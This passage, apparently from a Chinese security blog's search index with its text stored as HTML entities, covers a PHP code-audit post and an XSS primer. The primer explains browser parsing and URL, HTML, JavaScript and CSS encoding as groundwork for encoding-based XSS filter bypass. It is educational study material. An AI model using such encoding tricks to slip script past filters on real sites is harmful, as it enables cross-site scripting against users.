&#x5BF9;&#x6846;&#x67B6;&#x7684;&#x7ED3;&#x6784;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x4E86;&#x89E3;&#xFF0C;&#x662F;&#x5426;&#x8C03;&#x7528;&#xFF0C;&#x5982;&#x4F55;&#x8C03;&#x7528;&#x4E5F;&#x4E0D;&#x592A;&#x6E05;&#x695A;&#x3002;&#x9700;&#x8981;&#x53BB;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#x6846;&#x67B6;&#x7684;&#x57FA;&#x672C;&#x77E5;&#x8BC6;&#x3002;","link":"/2019/05/18/PHP代码审计之重装漏洞/"},{"title":"XSS_01_从浏览器编码开始说起","text":"&#x7F16;&#x7801;&#x4E0E;&#x89E3;&#x7801;-&#x6D4F;&#x89C8;&#x5668;&#x505A;&#x4E86;&#x4EC0;&#x4E48; How browsers work &#x6D4F;&#x89C8;&#x5668;&#x7684;&#x7F16;&#x7801;&#x4E0E;&#x89E3;&#x7801;-&#x4F4E;&#x7EA7;&#x89E3;&#x6790; XSS&#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#x4E4B;&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x6790;&#x987A;&#x5E8F; &#x66F4;&#x591A;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x5230;&#x6587;&#x7AE0;&#x5185;&#x7EC6;&#x770B;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x505A;&#x7B80;&#x8981;&#x8BB0;&#x5F55;&#x3002; &#x6D4F;&#x89C8;&#x5668;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#xFF1A;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#xFF1A; &#x901A;&#x8FC7;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x8BF7;&#x6C42;&#x5E76;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x4E2D;&#x663E;&#x793A;&#x5B83;&#x6765;&#x663E;&#x793A;&#x60A8;&#x9009;&#x62E9;&#x7684;Web&#x8D44;&#x6E90;&#x3002;&#x8D44;&#x6E90;&#x7684;&#x4F4D;&#x7F6E;&#x7531;&#x7528;&#x6237;&#x4F7F;&#x7528;URI&#xFF08;&#x7EDF;&#x4E00;&#x8D44;&#x6E90;&#x6807;&#x8BC6;&#x7B26;&#xFF09;&#x6307;&#x5B9A;&#x3002; &#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4E3B;&#x8981;&#x7EC4;&#x4EF6;&#xFF1A; &#x7528;&#x6237;&#x754C;&#x9762; &#x6D4F;&#x89C8;&#x5668;&#x5F15;&#x64CE; - &#x7528;&#x4E8E;&#x67E5;&#x8BE2;&#x548C;&#x64CD;&#x4F5C;&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x7684;&#x754C;&#x9762;&#x3002; &#x6E32;&#x67D3;&#x5F15;&#x64CE; - &#x8D1F;&#x8D23;&#x663E;&#x793A;&#x8BF7;&#x6C42;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x5982;&#x89E3;&#x6790;HTML&#x548C;CSS&#x5E76;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#x663E;&#x793A;&#x89E3;&#x6790;&#x7684;&#x5185;&#x5BB9;&#x3002; &#x7F51;&#x7EDC; - &#x7528;&#x4E8E;&#x7F51;&#x7EDC;&#x547C;&#x53EB;&#xFF0C;&#x5982;HTTP&#x8BF7;&#x6C42;&#x3002;&#x5B83;&#x5177;&#x6709;&#x5E73;&#x53F0;&#x72EC;&#x7ACB;&#x63A5;&#x53E3;&#x548C;&#x6BCF;&#x4E2A;&#x5E73;&#x53F0;&#x7684;&#x5E95;&#x5C42;&#x5B9E;&#x73B0;&#x3002; UI&#x540E;&#x7AEF; - &#x7528;&#x4E8E;&#x7ED8;&#x5236;&#x7EC4;&#x5408;&#x6846;&#x548C;&#x7A97;&#x53E3;&#x7B49;&#x57FA;&#x672C;&#x5C0F;&#x90E8;&#x4EF6;&#x3002;&#x5B83;&#x516C;&#x5F00;&#x4E86;&#x4E00;&#x4E2A;&#x975E;&#x5E73;&#x53F0;&#x7279;&#x5B9A;&#x7684;&#x901A;&#x7528;&#x63A5;&#x53E3;&#x3002;&#x5B83;&#x4E0B;&#x9762;&#x4F7F;&#x7528;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x754C;&#x9762;&#x65B9;&#x6CD5;&#x3002; JavaScript&#x89E3;&#x91CA;&#x5668;&#x3002;&#x7528;&#x4E8E;&#x89E3;&#x6790;&#x548C;&#x6267;&#x884C;JavaScript&#x4EE3;&#x7801;&#x3002; &#x6570;&#x636E;&#x5B58;&#x50A8;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6301;&#x4E45;&#x5C42;&#x3002;&#x6D4F;&#x89C8;&#x5668;&#x9700;&#x8981;&#x4FDD;&#x5B58;&#x786C;&#x76D8;&#x4E0A;&#x7684;&#x5404;&#x79CD;&#x6570;&#x636E;&#xFF0C;&#x4F8B;&#x5982;cookie&#x3002;&#x65B0;&#x7684;HTML&#x89C4;&#x8303;&#xFF08;HTML5&#xFF09;&#x5B9A;&#x4E49;&#x4E86;&#x201C;web&#x6570;&#x636E;&#x5E93;&#x201D;&#xFF0C;&#x5B83;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#xFF08;&#x5C3D;&#x7BA1;&#x5F88;&#x8F7B;&#x7684;&#xFF09;&#x6570;&#x636E;&#x5E93;&#x3002; &#x6E32;&#x67D3;&#x5F15;&#x64CE;&#xFF1A;Firefox&#x4F7F;&#x7528;Gecko&#x2013;&#x4E00;&#x79CD;&#x201C;&#x81EA;&#x5236;&#x201D;Mozilla&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x3002;Safari&#x548C;Chrome&#x90FD;&#x4F7F;&#x7528;Webkit&#x3002; Webkit&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#xFF0C;&#x8D77;&#x521D;&#x662F;Linux&#x5E73;&#x53F0;&#x7684;&#x5F15;&#x64CE;&#xFF0C;&#x5E76;&#x7531;Apple&#x4FEE;&#x6539;&#x4EE5;&#x652F;&#x6301;Mac&#x548C;Windows&#x3002;Webkit&#x8BE6;&#x7EC6; &#x4E3B;&#x8981;&#x6D41;&#x7A0B;&#xFF1A; &#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x5C06;&#x5F00;&#x59CB;&#x4ECE;&#x7F51;&#x7EDC;&#x5C42;&#x83B7;&#x53D6;&#x6240;&#x8BF7;&#x6C42;&#x6587;&#x6863;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x8FD9;&#x901A;&#x5E38;&#x662F;&#x4EE5;8K&#x5757;&#x7684;&#x5F62;&#x5F0F;&#x5B8C;&#x6210;&#x7684;&#x3002; &#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x5F00;&#x59CB;&#x89E3;&#x6790;HTML&#x6587;&#x6863;&#x5E76;&#x5C06;&#x6807;&#x8BB0;&#x8F6C;&#x6362;&#x4E3A;&#x540D;&#x4E3A;&#x201C;&#x5185;&#x5BB9;&#x6811;&#x201D;&#x7684;DOM&#x8282;&#x70B9;&#x3002;&#x5B83;&#x89E3;&#x6790;&#x5916;&#x90E8;CSS&#x6587;&#x4EF6;&#x548C;&#x6837;&#x5F0F;&#x5143;&#x7D20;&#x4E2D;&#x7684;&#x6837;&#x5F0F;&#x6570;&#x636E;&#x3002;&#x6837;&#x5F0F;&#x4FE1;&#x606F;&#x4E0E;HTML&#x4E2D;&#x7684;&#x53EF;&#x89C6;&#x6307;&#x4EE4;&#x4E00;&#x8D77;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x53E6;&#x4E00;&#x4E2A;&#x6811; - &#x6E32;&#x67D3;&#x6811;&#x3002; &#x6E32;&#x67D3;&#x6811;&#x5305;&#x542B;&#x5177;&#x6709;&#x89C6;&#x89C9;&#x5C5E;&#x6027;&#xFF08;&#x5982;&#x989C;&#x8272;&#x548C;&#x5C3A;&#x5BF8;&#xFF09;&#x7684;&#x77E9;&#x5F62;&#x3002;&#x77E9;&#x5F62;&#x7684;&#x987A;&#x5E8F;&#x6B63;&#x786E;&#x7684;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#x663E;&#x793A;&#x3002; &#x5728;&#x6784;&#x5EFA;&#x6E32;&#x67D3;&#x6811;&#x4E4B;&#x540E;&#xFF0C;&#x5B83;&#x5C06;&#x7ECF;&#x5386;&#x201C; &#x5E03;&#x5C40; &#x201D;&#x8FC7;&#x7A0B;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4E3A;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x63D0;&#x4F9B;&#x5B83;&#x5E94;&#x8BE5;&#x51FA;&#x73B0;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#x7684;&#x7CBE;&#x786E;&#x5750;&#x6807;&#x3002;&#x4E0B;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;&#x662F;&#x7ED8;&#x5236; - &#x5C06;&#x904D;&#x5386;&#x6E32;&#x67D3;&#x6811;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;UI&#x540E;&#x7AEF;&#x5C42;&#x7ED8;&#x5236;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x3002; &#x5728;&#x5F00;&#x59CB;&#x6784;&#x5EFA;&#x548C;&#x5E03;&#x5C40;&#x6E32;&#x67D3;&#x6811;&#x4E4B;&#x524D;&#xFF0C;&#x5B83;&#x4E0D;&#x4F1A;&#x7B49;&#x5230;&#x89E3;&#x6790;&#x6240;&#x6709;HTML&#x3002;&#x5C06;&#x89E3;&#x6790;&#x548C;&#x663E;&#x793A;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#xFF0C;&#x540C;&#x65F6;&#x7EE7;&#x7EED;&#x5904;&#x7406;&#x6765;&#x81EA;&#x7F51;&#x7EDC;&#x7684;&#x5176;&#x4F59;&#x5185;&#x5BB9;&#x3002; Webkit &#x6D41;&#x7A0B;&#xFF1A; URL &#x89E3;&#x6790;&#x5668; &gt; HTML &#x89E3;&#x6790;&#x5668; &gt; CSS &#x89E3;&#x6790;&#x5668; &gt; JS&#x89E3;&#x6790;&#x5668; &#x89E3;&#x6790;&#xFF1A;&#x89E3;&#x6790;&#x5668;&#x7684;&#x7C7B;&#x578B;&#xFF1A; &#x81EA;&#x4E0A;&#x5411;&#x4E0B;&#x89E3;&#x6790;&#x5668;&#xFF1A;&#x4F1A;&#x770B;&#x5230;&#x8BED;&#x6CD5;&#x7684;&#x9AD8;&#x7EA7;&#x7ED3;&#x6784;&#xFF0C;&#x5E76;&#x5C1D;&#x8BD5;&#x5339;&#x914D;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x3002; &#x81EA;&#x4E0B;&#x800C;&#x4E0A;&#x89E3;&#x6790;&#x5668;&#xFF1A;&#x4ECE;&#x8F93;&#x5165;&#x5F00;&#x59CB;&#xFF0C;&#x9010;&#x6E10;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x4E3A;&#x8BED;&#x6CD5;&#x89C4;&#x5219;&#xFF0C;&#x4ECE;&#x4F4E;&#x7EA7;&#x89C4;&#x5219;&#x5F00;&#x59CB;&#xFF0C;&#x76F4;&#x5230;&#x6EE1;&#x8DB3;&#x9AD8;&#x7EA7;&#x89C4;&#x5219;&#x3002; HTML&#x89E3;&#x6790;&#x5668;&#xFF1A;HTML&#x4E0D;&#x80FD;&#x8F7B;&#x6613;&#x89E3;&#x6790;&#xFF0C;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x4F20;&#x7EDF;&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x7684;&#x8BED;&#x6CD5;&#x4E0D;&#x662F;&#x65E0;&#x4E0A;&#x4E0B;&#x6587;&#x8BED;&#x6CD5;&#xFF0C;&#x4E5F;&#x4E0D;&#x662F;XML&#x89E3;&#x6790;&#x5668;&#x3002; HTML&#x89E3;&#x6790;&#x5668;&#x7684;&#x5DE5;&#x4F5C;&#x662F;&#x5C06;HTML&#x6807;&#x8BB0;&#x89E3;&#x6790;&#x4E3A;&#x89E3;&#x6790;&#x6811;&#x3002; HTML&#x5B9A;&#x4E49;&#x91C7;&#x7528;DTD&#x683C;&#x5F0F;&#x3002; HTML5&#x89C4;&#x8303;&#x8BE6;&#x7EC6;&#x63CF;&#x8FF0;&#x4E86;&#x89E3;&#x6790;&#x7B97;&#x6CD5;&#x3002;&#x8BE5;&#x7B97;&#x6CD5;&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x9636;&#x6BB5; - &#x6807;&#x8BB0;&#x5316;&#x548C;&#x6811;&#x5F62;&#x7ED3;&#x6784;&#x3002; &#x6807;&#x8BB0;&#x5316;&#x662F;&#x8BCD;&#x6CD5;&#x5206;&#x6790;&#xFF0C;&#x5C06;&#x8F93;&#x5165;&#x89E3;&#x6790;&#x4E3A;&#x6807;&#x8BB0;&#x3002;HTML&#x6807;&#x8BB0;&#x5305;&#x62EC;&#x5F00;&#x59CB;&#x6807;&#x8BB0;&#xFF0C;&#x7ED3;&#x675F;&#x6807;&#x8BB0;&#xFF0C;&#x5C5E;&#x6027;&#x540D;&#x79F0;&#x548C;&#x5C5E;&#x6027;&#x503C;&#x3002; &#x6807;&#x8BB0;&#x751F;&#x6210;&#x5668;&#x8BC6;&#x522B;&#x6807;&#x8BB0;&#xFF0C;&#x5C06;&#x5176;&#x63D0;&#x4F9B;&#x7ED9;&#x6811;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5E76;&#x4F7F;&#x7528;&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x6765;&#x8BC6;&#x522B;&#x4E0B;&#x4E00;&#x4E2A;&#x6807;&#x8BB0;&#xFF0C;&#x4F9D;&#x6B64;&#x7C7B;&#x63A8;&#xFF0C;&#x76F4;&#x5230;&#x8F93;&#x5165;&#x7ED3;&#x675F;&#x3002; &#x4E24;&#x79CD;&#x7B97;&#x6CD5;&#xFF1A;The tokenization algorithm(&#x6807;&#x8BB0;&#x5316;&#x7B97;&#x6CD5;) AND Tree construction algorithm.(&#x6811;&#x6784;&#x9020;&#x7B97;&#x6CD5;)(&#x6CA1;&#x6709;&#x6DF1;&#x5165;&#x4E86;&#x89E3;) &#x89E3;&#x6790;&#x5B8C;&#x6210;&#x540E;&#x7684;&#x64CD;&#x4F5C;: &#x5728;&#x6B64;&#x9636;&#x6BB5;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5C06;&#x6587;&#x6863;&#x6807;&#x8BB0;&#x4E3A;&#x4EA4;&#x4E92;&#x5F0F;&#xFF0C;&#x5E76;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x5904;&#x4E8E;&#x201C;&#x5EF6;&#x8FDF;&#x201D;&#x6A21;&#x5F0F;&#x7684;&#x811A;&#x672C; - &#x5728;&#x89E3;&#x6790;&#x6587;&#x6863;&#x540E;&#x5E94;&#x6267;&#x884C;&#x7684;&#x811A;&#x672C;&#x3002;&#x7136;&#x540E;&#x5C06;&#x6587;&#x6863;&#x72B6;&#x6001;&#x8BBE;&#x7F6E;&#x4E3A;&#x201C;&#x5B8C;&#x6210;&#x201D;&#xFF0C;&#x5E76;&#x5C06;&#x89E6;&#x53D1;&#x201C;&#x52A0;&#x8F7D;&#x201D;&#x4E8B;&#x4EF6;&#x3002; &#x5176;&#x540E;&#x8FD8;&#x5305;&#x62EC;CSS&#x89E3;&#x6790;&#xFF0C;DOM&#x89E3;&#x6790;&#x4E0E;&#x5E03;&#x5C40;&#x7B49;&#xFF0C;&#x8FD9;&#x91CC;&#x90FD;&#x4E0D;&#x6DF1;&#x5165;&#x4E86;&#x89E3;&#x4E86;&#x3002;&#x4E3B;&#x8981;&#x4E86;&#x89E3;&#x6E32;&#x67D3;&#x6D41;&#x7A0B;&#x5373;&#x53EF;&#x3002; &#x7F16;&#x7801;&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#xFF1A; url&#x7F16;&#x7801;&#xFF1A; &#x6807;&#x51C6;&#x7684;url&#x7ED3;&#x6784;&#x662F;: scheme://login:password@address:port/path?quesry_string#fragment &#x4F8B;&#xFF1A;http://example.com/test.php?uid=27&amp;content=on#main &#x5E73;&#x5E38;&#x7684;URL&#xFF1A;&#x50CF;&#x5F00;&#x5934;&#x7684; &#x201C; http: &#x201C;&#xFF0C;&#x534F;&#x8BAE;&#x540E;&#x9762;&#x8DDF;&#x4E00;&#x4E2A;&#x5192;&#x53F7;&#xFF0C;&#x8FD8;&#x6709;&#x4E4B;&#x540E;&#x7684;&#x4E24;&#x4E2A;&#x6B63;&#x659C;&#x6760;&#x201D; // &#x201C;, &#x540E;&#x9762;&#x518D;&#x8DDF;&#x57DF;&#x540D;&#xFF0C;&#x518D;&#x8DDF;&#x5730;&#x5740;&#xFF0C;&#x518D;&#x8DDF;&#x53C2;&#x6570;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x518D;&#x8DDF;&#x7247;&#x6BB5;id&#x2026; &#x4E00;&#x4E9B;&#x7B26;&#x53F7;&#x975E;&#x5E38;&#x201D;&#x5E38;&#x89C4;&#x201D;&#xFF0C;&#x6BD4;&#x5982;&#x5192;&#x53F7;&#xFF0C;&#x6B63;&#x659C;&#x6760;&#xFF0C;&#x95EE;&#x53F7;&#x2026;&#x8FD9;&#x4E9B;&#x90FD;&#x662F;&#x6D4F;&#x89C8;&#x5668;/&#x670D;&#x52A1;&#x5668;&#x7528;&#x6765;&#x89E3;&#x6790;url&#x7528;&#x4E8E;&#x8BED;&#x4E49;&#x5206;&#x9694;&#x7684;&#x4FDD;&#x7559;&#x5B57;&#x7B26;&#xFF0C;&#x5982;&#x679C;&#x51FA;&#x73B0;&#x5728;url&#x91CC;&#x5C31;&#x4F1A;&#x7834;&#x574F;&#x8BED;&#x6CD5;&#xFF0C;&#x5F71;&#x54CD;&#x6B63;&#x5E38;&#x89E3;&#x6790;&#xFF0C;&#x5BFC;&#x81F4;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x7684;&#x53D1;&#x751F;&#x3002; &#x4E8E;&#x662F;&#x5C31;&#x6709;&#x4E86;url&#x7F16;&#x7801;&#xFF0C;&#x56E0;&#x4E3A;&#x6709;&#x4E9B;&#x4FDD;&#x7559;&#x5B57;&#x7B26;&#x53EF;&#x80FD;&#x786E;&#x5B9E;&#x6709;&#x5FC5;&#x8981;&#x9700;&#x8981;&#x5728;url&#x91CC;&#x51FA;&#x73B0;&#xFF0C;&#x5B83;&#x4EE5;&#x4E00;&#x4E2A;&#x767E;&#x5206;&#x53F7;%&#x548C;&#x8BE5;&#x5B57;&#x7B26;&#x7684;ASCII&#x5BF9;&#x5E94;&#x7684;2&#x4F4D;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#x53BB;&#x66FF;&#x6362;&#x8FD9;&#x4E9B;&#x5B57;&#x7B26; &#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7684;URL&#x5B57;&#x7B26;&#x4EE5;&#x53CA;&#x5176;&#x7F16;&#x7801;&#x503C;&#xFF1A; &#x8BE6;&#x60C5; HTML URL &#x7F16;&#x7801; 1234567891011121314151617181920&#x5B57;&#x7B26; URL&#x7F16;&#x7801;&#x503C;&#x7A7A;&#x683C; %20&quot; %22# %23% %25&amp; %26( %28) %29+ %2B, %2C/ %2F: %3A; %3B&lt; %3C= %3D&gt; %3E? %3F@ %4o\\ %5C| %7C html&#x7F16;&#x7801;&#xFF1A; url&#x7684;&#x95EE;&#x9898;&#x7C7B;&#x4F3C;&#xFF0C;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x5728;&#x6807;&#x7B7E;&#x5185;&#x5BB9;&#x4E2D;&#x51FA;&#x73B0;&#x4EE5;&#x53CA;&#x5E94;&#x5BF9;&#x67D0;&#x4E9B;&#x653B;&#x51FB;&#xFF0C;&#x67D0;&#x4E9B;&#x4FDD;&#x7559;&#x5B57;&#x7B26;&#x51FA;&#x73B0;&#x5728;&#x6587;&#x672C;&#x8282;&#x70B9;&#x548C;&#x6807;&#x7B7E;&#x503C;&#x91CC;&#x662F;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x591A;&#x91CD;&#x6807;&#x7B7E;&#xFF0C;xss&#x2026;&#x7B49;&#x7B49;&#x3002;&#x4E8E;&#x662F;&#x5C31;&#x6709;&#x4E86;html&#x7F16;&#x7801;&#x3002; &#x4E00;&#x822C;&#x4EE5; &amp; &#x5F00;&#x5934;&#xFF0C;&#x4EE5;&#x5206;&#x53F7; ; &#x7ED3;&#x5C3E; 1234567&#x5E38;&#x7528;HTML&#x7F16;&#x7801;&#xFF1A;&#x7ED3;&#x679C; &#x63CF;&#x8FF0; &#x5B9E;&#x4F53;&#x540D;&#x79F0; &#x5B9E;&#x4F53;&#x7F16;&#x53F7;&quot; quotation mark &amp;quot; &amp;#34;&apos; apostrophe &amp;apos; &amp;#39;&amp; ampersand &amp;amp; &amp;#38;&lt; less-than &amp;lt; &amp;#60;&gt; greater-than &amp;gt; &amp;#62; &#x8FD8;&#x53EF;&#x4EE5;&#x63D2;&#x5165;&#x4EE5;&#x4EFB;&#x610F;&#x5341;&#x8FDB;&#x5236;ASCII&#x7801;&#x6216;Unicode&#x5B57;&#x7B26;&#x7F16;&#x7801;&#xFF0C;&#x6837;&#x5F0F;&#x4E3A;&#xFF1A;&amp;#&#x6570;&#x503C;; 12&#x5DE6;&#x5C16;&#x62EC;&#x53F7; &lt; &#x5199;&#x4F5C; &amp;#60&#x53F3;&#x5C16;&#x62EC;&#x53F7; &gt; &#x5199;&#x4F5C; &amp;#62; HTML ISO-8859-1 &#x53C2;&#x8003;&#x624B;&#x518C; HTML&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x5BF9;&#x7167;&#x8868; js&#x7F16;&#x7801;&#xFF1A; JS&#x89E3;&#x6790;&#xFF08;\\uxxxx&#xFF09;&#x53EA;&#x652F;&#x6301;UNICODE&#x3002; js&#x5E38;&#x89C1;&#x7684;&#x53CD;&#x659C;&#x6760;&#x65B9;&#x5F0F;&#x7F16;&#x7801;&#x5904;&#x7406;&#xFF1A; 1234\\b&#x9000;&#x683C;&#x7B26;&#xFF0C;\\t&#x5236;&#x8868;&#x7B26;&#xFF0C;\\v&#x5782;&#x76F4;&#x5236;&#x8868;&#x7B26;&#x7B49;3&#x4F4D;&#x6570;&#x5B57;&#xFF0C;&#x4E0D;&#x8DB3;&#x4F4D;&#x6570;&#x7528;0&#x8865;&#x5145;&#xFF0C;&#x6309;8&#x4F4D;&#x539F;&#x5B57;&#x7B26;&#x516B;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#xFF0C;&#x5982; \\145 &#x4EE3;&#x8868; e2&#x4F4D;&#x6570;&#x5B57;&#xFF0C;&#x4E0D;&#x8DB3;&#x4F4D;&#x6570;&#x7528;0&#x8865;&#x5145;&#xFF0C;&#x6309;8&#x4F4D;&#x539F;&#x5B57;&#x7B26;16&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#xFF0C;&#x524D;&#x7F00; x &#xFF0C;&#x5982; \\x65 &#x4EE3;&#x8868; e4&#x4F4D;&#x6570;&#x5B57;&#xFF0C;&#x4E0D;&#x8DB3;&#x4E3A;&#x6570;&#x7528;0&#x8865;&#x5145;&#xFF0C;&#x6309;16&#x4F4D;&#x539F;&#x5B57;&#x7B26;16&#x8FDB;&#x5236;Unicode&#x6570;&#x503C;&#x7F16;&#x7801;&#xFF0C;&#x524D;&#x7F00; u &#xFF0C;&#x5982; \\u0065 &#x4EE3;&#x8868; e CSS&#x7F16;&#x7801; CSS&#x7684;&#x5C5E;&#x6027;&#x548C;&#x503C;&#x90FD;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;CSS&#x7F16;&#x7801;&#x548C;&#x89E3;&#x6790;&#xFF0C;&#x5192;&#x53F7;:&#x4E0D;&#x53EF;&#x4EE5; CSS &#x89E3;&#x6790;&#x5668;&#x5E76;&#x4E0D;&#x4F1A;&#x7B49;&#x5230;&#x6240;&#x6709;&#x7684;html&#x90FD;&#x89E3;&#x6790;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#x518D;&#x53BB;&#x6784;&#x5EFA;&#x548C;&#x5E03;&#x5C40;render&#x6811;&#x3002;&#x5B83;&#x662F;&#x89E3;&#x6790;&#x5B8C;&#x4E00;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x5C31;&#x663E;&#x793A;&#x4E00;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#xFF0C;&#x540C;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x5728;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x4E0B;&#x8F7D;&#x5176;&#x4F59;&#x5185;&#x5BB9;&#x3002; CSS &#x7F16;&#x7801;&#x89E3;&#x6790;&#x662F;&#x7528;&#x4E86;&#x4E00;&#x5957;&#x4E0D;&#x592A;&#x6B63;&#x7EDF;&#x7684;&#x8F6C;&#x4E49;&#x7B56;&#x7565;&#xFF1A;&#x7528;&#x4E00;&#x4E2A;&#x53CD;&#x659C;&#x6760;&#xFF0C;&#x540E;&#x8FB9;&#x8DDF;1~6&#x4F4D;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x6784;&#x6210;&#x3002;&#xFF0C;&#x6240;&#x4EE5;&#x5B57;&#x6BCD;e &#x53EF;&#x4EE5;&#x7F16;&#x7801;&#x4E3A; \\65, \\065,\\000065&#x3002;&#x800C;&#x56E0;&#x4E3A;&#x8FD9;&#x6837;&#xFF0C;&#x540E;&#x8FB9;&#x5C31;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x7D27;&#x8DDF;&#x6570;&#x5B57;&#x6216;&#x5B57;&#x6BCD;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x88AB;&#x5F53;&#x6210;&#x8F6C;&#x4E49;&#x91CC;&#x7684;&#x5185;&#x5BB9;&#x5904;&#x7406;&#xFF0C;&#x6240;&#x4EE5;CSS &#x9009;&#x62E9;&#x4E86;&#x7A7A;&#x683C;&#x4F5C;&#x4E3A;&#x7EC8;&#x6B62;&#x6807;&#x8BC6;&#xFF0C;&#x5728;&#x89E3;&#x7801;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x518D;&#x5C06;&#x7A7A;&#x683C;&#x53BB;&#x9664;&#x3002; 5 .DOM &#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#x3002; `document.getElementById(&quot;pic1&quot;).innerHTML = &quot;&quot;;` &#x5982;&#x679C;&#x5C06;pic1&#x4E5F;&#x7F16;&#x7801;&#x7684;&#x8BDD;&#xFF0C;&#x4E5F;&#x4F1A;&#x5148;&#x89E3;&#x7801;&#x518D;&#x6DFB;&#x52A0;&#x5230;HTML&#x91CC;&#x3002; DOM &#x64CD;&#x4F5C;&#x5B9E;&#x9645;&#x4E0A;&#x662F;js&#x5F3A;&#x52BF;&#x4ECB;&#x5165;HTML&#x548C;CSS&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x5BFC;&#x81F4;HTML&#x6807;&#x7B7E;&#x7684;&#x5C5E;&#x6027;&#x548C;&#x503C;&#x90FD;&#x53EF;&#x4EE5;&#x505A;JS&#x7F16;&#x7801;&#x548C;&#x89E3;&#x6790;&#x3002; &#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x7801;&#x5904;&#x7406;&#x6D41;&#x6D4F;&#x89C8;&#x5668;&#x63A5;&#x6536;&#x65F6;&#x4E00;&#x822C;&#x4E0D;&#x9700;&#x8981;&#x5BF9;url&#x8FDB;&#x884C;&#x89E3;&#x7801;&#x5904;&#x7406;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x53D1;&#x9001;&#x540E;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x624D;&#x9700;&#x8981;&#x5BF9;url&#x8FDB;&#x884C;&#x89E3;&#x7801;&#x6765;&#x786E;&#x5B9A;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x548C;&#x5B9A;&#x4F4D;&#x8D44;&#x6E90;&#x3002; HTML HTML&#x89E3;&#x7801;&#x662F;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x6784;&#x5EFA;&#x5B8C;DOM&#x6811;&#x4EE5;&#x540E;&#x624D;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#x7684; &#x4E00;&#x6BB5;HTML&#x4F8B;&#x5B50;&#xFF1A; 1234567&lt;html&gt; &lt;h1&gt;Main Title&lt;/h1&gt; &lt;div class=&quot;content&quot;&gt; &lt;h2&gt;Second Title&lt;/h2&gt; &lt;p&gt;Content&lt;/p&gt; &lt;/div&gt;&lt;/html&gt; &#x5F53;&#x6211;&#x4EEC;&#x628A;&lt;h1&gt;Main Title&lt;/h1&gt;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x6210;&#xFF1A; &lt;&amp;#104;1&gt;Main Title&lt;/h1&gt; &lt;h1&gt;M&amp;#97;in T&amp;#105;tle&lt;/h1&gt; 